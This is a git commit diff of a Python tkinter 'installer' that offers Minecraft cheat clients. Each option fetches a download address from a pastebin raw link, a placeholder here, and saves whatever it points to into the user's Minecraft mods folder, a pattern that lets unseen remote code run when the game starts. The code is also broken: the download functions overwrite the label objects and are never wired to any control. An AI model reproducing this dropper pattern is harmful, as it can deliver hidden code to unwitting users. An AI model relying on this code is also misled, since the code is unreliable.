74b8b123f9f1fc2390ddab9c939ac5ce6732d7de
CatsAreGood1337 <ihackedfuture@gmail.com>
2021-11-15 17:30:37 +0300

    bit changes

--- installer.py
+++ installer.py
@@ -1,32 +1,39 @@
+import tkinter as tk
 from tkinter import *
 import wget
 from requests import get
 import getpass
 
-x, y = 42 , 401
+Hacks = [
+"PyroClient",
+"KonasClient"
+] 
 
+app = tk.Tk()
 
-def download():
+app.geometry('600x600')
+
+variable = tk.StringVar(app)
+variable.set(Hacks[0])
+
+opt = tk.OptionMenu(app, variable, *Hacks)
+opt.config(width=90, font=('Helvetica', 12))
+opt.pack()
+
+PyroClient = tk.Label(text="", font=('Helvetica', 12), fg='red')
+PyroClient.pack(side="top")
+
+def PyroClient():
     url = 'https://pastebin.com/raw/url'
     response = get(url)
     wget.download(response.text[:500], "C:/Users/" + getpass.getuser() + "/AppData/Roaming/.minecraft/mods/example")
 
-tk = Tk()
+KonasClient = tk.Label(text="", font=('Helvetica', 12), fg='red')
+KonasClient.pack(side="top")
 
-tk.geometry("size of bg")
-tk.title("name of hack or whatever")
+def KonasClient():
+    url = 'https://pastebin.com/raw/url'
+    response = get(url)
+    wget.download(response.text[:500], "C:/Users/" + getpass.getuser() + "/AppData/Roaming/.minecraft/mods/example")
 
-
-install_button = PhotoImage(file=r'bg.png')
-background_image = PhotoImage(file=r'button.png')
-
-background_label = Label(tk, image=background_image)
-background_label.place(x=0, y=0, relwidth=1, relheight=1)
-
-button = Button(tk, image=install_button, command=download)
-button.place(x=x, y=y)
-
-
-tk.resizable(width=False, height=False)
-
-tk.mainloop()
+app.mainloop()
